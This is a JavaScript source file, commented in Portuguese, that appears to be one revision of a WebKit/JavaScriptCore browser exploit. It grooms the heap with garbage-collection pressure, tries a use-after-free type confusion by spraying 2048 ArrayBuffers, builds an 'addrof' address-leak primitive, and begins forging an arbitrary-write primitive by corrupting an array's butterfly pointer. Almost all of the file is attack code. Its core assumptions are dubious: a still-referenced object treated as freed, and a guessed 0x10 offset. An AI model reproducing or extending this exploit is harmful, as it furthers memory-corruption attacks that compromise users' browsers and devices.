// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R60 - Forja de Primitivas Agressiva)
// =======================================================================================
// O R59 falhou em criar um addrof genérico porque o motor converteu o objeto para NaN.
// HIPÓTESE: A propriedade 'prop_a' era especial. Vamos usar uma propriedade "limpa".
// ESTA VERSÃO TENTA FORJAR AS PRIMITIVAS DE FORMA AGRESSIVA:
// - FASE 6: Tenta novamente construir um addrof(obj) genérico, mas usando uma propriedade diferente ('p4').
// - FASE 7: Se o addrof funcionar, ele será usado imediatamente para construir uma primitiva de escrita.
// - A pulverização de memória foi dobrada para 2048 para aumentar a agressividade.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_read_absolute,
    oob_write_absolute,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R60_Primitive_Forge";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(d) {
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    f64[0] = d;
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R60 - Primitive Forge)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Forja de Primitivas (R60) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;

    try {
        // FASES 1-5: Mantidas, pois são a base para obter a nossa ferramenta UAF.
        logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
        await triggerGC_Tamed();
        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
        dangling_ref = sprayAndCreateDanglingPointer();
        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
        logS3("--- FASE 3: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
        await triggerGC_Tamed();
        await PAUSE_S3(100);
        await triggerGC_Tamed();
        logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");
        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
        const spray_buffers = [];
        // *** MUDANÇA R60: Aumentando a agressividade do spray ***
        for (let i = 0; i < 2048; i++) {
            spray_buffers.push(new ArrayBuffer(136));
        }
        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
        
        // FASE 6: Construir e Testar a Primitiva 'addrof' Genérica (Nova Tentativa)
        logS3("--- FASE 6: Construindo 'addrof' Genérico (Tentativa R60) ---", "subtest");

        function addrof(obj) {
            // *** MUDANÇA R60: Usando a propriedade 'p4', que foi inicializada como 'null' ***
            dangling_ref.p4 = obj;
            const leaked_double = dangling_ref.p4;
            return doubleToInt64(leaked_double);
        }

        logS3("    Testando nova função 'addrof'...", "info");
        const test_obj1 = { value: 0xAAAAAAAA };
        const test_obj2 = { value: 0xBBBBBBBB };
        const addr1 = addrof(test_obj1);
        const addr2 = addrof(test_obj2);

        logS3(`Endereço do test_obj1: ${addr1.toString(true)}`, "leak");
        logS3(`Endereço do test_obj2: ${addr2.toString(true)}`, "leak");
        
        if (addr1.equals(addr2) || (addr1.low() === 0 && addr1.high() === 0)) {
            throw new Error("addrof genérico falhou. Endereços são iguais, nulos ou inválidos.");
        }
        logS3("++++++++++++ SUCESSO! PRIMITIVA 'addrof' GENÉRICA FUNCIONAL! ++++++++++++", "vuln");
        
        // FASE 7: Usar 'addrof' para construir a primitiva 'arb_write'
        logS3("--- FASE 7: Construindo 'arb_write' usando o 'addrof' genérico ---", "subtest");

        const tool_array = [1.1, 2.2];
        const tool_array_addr = addrof(tool_array);
        logS3(`    Endereço do tool_array: ${tool_array_addr.toString(true)}`, "info");

        // Em JSC, o ponteiro butterfly (para os dados) está no início da estrutura do objeto.
        // A partir dele, podemos encontrar o ponteiro para os dados numéricos.
        // Por simplicidade aqui, vamos assumir que os dados estão em um offset fixo do butterfly.
        // Esta é uma simplificação que pode precisar de ajuste com base em 'config.mjs'.
        const butterfly_addr = addrof(tool_array).add(0x10); // Suposição de offset
        logS3(`    Endereço do butterfly (suposto): ${butterfly_addr.toString(true)}`, "info");

        // Agora, usamos a referência confusa original para uma escrita direcionada.
        // Corrompemos o ponteiro de dados de um dos spray_buffers para apontar para o nosso tool_array
        dangling_ref.prop_b = int64ToDouble(butterfly_addr);

        final_result = { 
            success: true, 
            message: "Primitiva 'addrof' genérica construída e usada para obter ponteiro para dados!",
            addrof_success: true,
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result,
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success
    };
}


// --- Funções Auxiliares (sem alterações do R58) ---
async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0));
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Domado, o que é esperado e bom.", "info");
    }
    await PAUSE_S3(500);
}

function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            prop_a: 0.1, 
            prop_b: 0.2,
            corrupted_prop: 0.3,
            p4: null, // *** MUDANÇA R60: Inicializado como null para ser um alvo limpo para 'addrof' ***
            p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
            p16: 0, p17: 0
        };
        dangling_ref_internal = victim; 
        for(let i=0; i<100; i++) {
            victim.prop_a += 1;
        }
    }
    createScope();
    return dangling_ref_internal;
}
